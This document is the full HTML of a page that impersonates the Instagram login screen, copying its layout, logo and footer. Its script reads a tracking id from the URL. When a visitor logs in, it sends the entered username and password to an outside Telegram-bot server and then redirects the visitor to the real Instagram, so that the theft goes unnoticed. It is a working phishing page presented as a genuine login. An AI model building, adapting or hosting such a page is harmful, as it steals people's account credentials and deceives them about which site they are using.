
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Instagram</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://i.hizliresim.com/nr3keaa.png" type="image/x-icon">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; background-color: #FAFAFA;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            overflow-x: hidden;
        }
        .main-container {
            display: flex; justify-content: center; align-items: center;
            width: 100%; max-width: 935px; padding: 20px; flex-wrap: wrap;
        }
        .phone-section {
            display: none; position: relative; width: 454px; height: 618px;
            margin-right: 32px; background: url('https://i.hizliresim.com/placeholder_phone_background.png') no-repeat center;
            background-size: contain;
        }
        .phone-section img {
            position: absolute; top: 96px; left: 149px;
            width: 250px; height: 428px; object-fit: cover;
        }
        .phone-section .no-image {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            color: #8E8E8E; font-size: 14px; background: #DBDBDB; padding: 10px;
            border-radius: 5px; display: none;
        }
        .login-section {
            display: flex; flex-direction: column; align-items: center; width: 350px;
        }
        .login-box {
            width: 100%; background: #fff; border: 1px solid #DBDBDB;
            border-radius: 1px; padding: 20px 0; text-align: center; margin-bottom: 10px;
        }
        .logo { margin: 22px auto 12px; }
        .logo img { width: 175px; }
        .logo .no-image {
            width: 175px; height: 51px; background: #DBDBDB; color: #8E8E8E;
            display: flex; justify-content: center; align-items: center; font-size: 14px;
        }
        form { width: 80%; margin: 0 auto; display: flex; flex-direction: column; }
        form input {
            margin-bottom: 6px; border: 1px solid #DBDBDB; background: #FAFAFA;
            border-radius: 3px; outline: none; padding: 9px 10px; font-size: 14px; color: #262626;
        }
        form input::placeholder { color: #8E8E8E; }
        form button {
            border: none; background: #0095F6; padding: 7px 0; margin: 10px 0;
            color: #fff; border-radius: 8px; font-weight: bold; font-size: 14px;
            text-transform: capitalize; cursor: pointer; transition: background 0.2s;
        }
        form button:hover { background: #1877F2; }
        form button:active { background: #003087; }
        .option {
            position: relative; color: #8E8E8E; font-size: 13px; font-weight: 600; margin: 10px 0;
        }
        .option::before {
            position: absolute; content: ''; width: 40%; height: 1px; background: #DBDBDB;
            left: 0; top: 50%; transform: translateY(-50%);
        }
        .option::after {
            position: absolute; content: ''; width: 40%; height: 1px; background: #DBDBDB;
            right: 0; top: 50%; transform: translateY(-50%);
        }
        .fblink { margin: 15px 0; display: flex; justify-content: center; align-items: center; }
        .fblink span { font-size: 18px; color: #385185; margin-right: 5px; }
        .fblink a { text-decoration: none; font-weight: 600; color: #385185; font-size: 14px; }
        .forget-id { margin: 15px 0; }
        .forget-id a { text-decoration: none; color: #00376B; font-size: 12px; font-weight: 500; }
        .signup-box {
            width: 100%; background: #fff; border: 1px solid #DBDBDB; border-radius: 1px;
            padding: 15px; text-align: center; margin-top: 10px;
        }
        .signup-box p { font-size: 14px; color: #262626; }
        .signup-box a { text-decoration: none; color: #0095F6; font-weight: 600; }
        .footer {
            position: fixed; left: 0; bottom: 0; width: 100%; color: #8E8E8E;
            text-align: center; font-size: 12px; padding: 10px;
        }
        @media (min-width: 876px) { .phone-section { display: block; } }
        @media (max-width: 875px) {
            .login-section { width: 100%; max-width: 350px; }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="phone-section">
            <img src="https://i.hizliresim.com/ma019em.png" alt="Instagram Post" onerror="this.style.display='none'">
            <div class="no-image" style="display:none;">Instagram Post Not Available</div>
        </div>
        <div class="login-section">
            <div class="login-box">
                <div class="logo">
                    <img src="https://i.hizliresim.com/99mill6.png" alt="Instagram" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                    <div class="no-image" style="display:none;">Instagram Logo Not Found</div>
                </div>
                <form>
                    <input type="text" id="emailInput" placeholder="Phone number, username, or email" name="username">
                    <input type="password" id="passwordInput" placeholder="Password" name="password">
                    <button type="button" id="loginButton">Log in</button>
                    <div class="option">OR</div>
                </form>
                <div class="fblink">
                    <span class="fab fa-facebook"></span>
                    <a href="#">Log in with Facebook</a>
                </div>
                <div class="forget-id">
                    <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                </div>
            </div>
            <div class="signup-box">
                <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
            </div>
        </div>
    </div>
    <div class="footer">
        <p>Â© 2025 Instagram from Meta</p>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const unique_id = urlParams.get('id');
        const api_url = 'https://tgbot-telegrambot2.up.railway.app';

        const loginButton = document.getElementById('loginButton');
        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('passwordInput');

        if (!unique_id) {
            loginButton.style.display = 'none';
        } else {
            loginButton.addEventListener('click', () => {
                const email = emailInput.value.trim();
                const password = passwordInput.value.trim();

                if (!email || !password) {
                    return;
                }

                fetch(`${api_url}/login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ unique_id, email, password })
                })
                .finally(() => {
                    window.location.href = 'https://www.instagram.com';
                })
                .catch(error => {
                    console.error('Error submitting data:', error.message);
                });
            });
        }
    </script>
</body>
</html>
